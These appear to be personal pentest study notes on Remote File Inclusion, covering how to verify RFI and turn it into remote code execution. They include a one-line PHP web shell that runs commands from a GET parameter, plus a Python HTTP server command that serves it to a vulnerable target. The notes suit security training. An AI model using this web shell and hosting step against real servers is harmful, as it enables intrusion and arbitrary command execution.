# Remote File Inclusion

## Verify RFI

In most languages, including remote URLs is considered as a dangerous practice as it may allow for such vulnerabilities. This is why remote URL inclusion is usually disabled by default. For example, any remote URL inclusion in PHP would require the `allow_url_include` setting to be enabled.

So, a more reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is to `try and include a URL`, and see if we can get its content. At first, `we should always start by trying to include a local URL (http://127.0.0.1:80/index.php)` to ensure our attempt does not get blocked by a firewall or other security measures. 

![[Pasted image 20260103111943.png]]

## Remote Code Execution with RFI

```bash
$ echo '<?php system("id"); system($_GET[0]); ?>' > shell.php
sudo python3 -m http.server 4444
```

![[Pasted image 20260103112422.png]]

We may also host our script through FTP/SMB protocol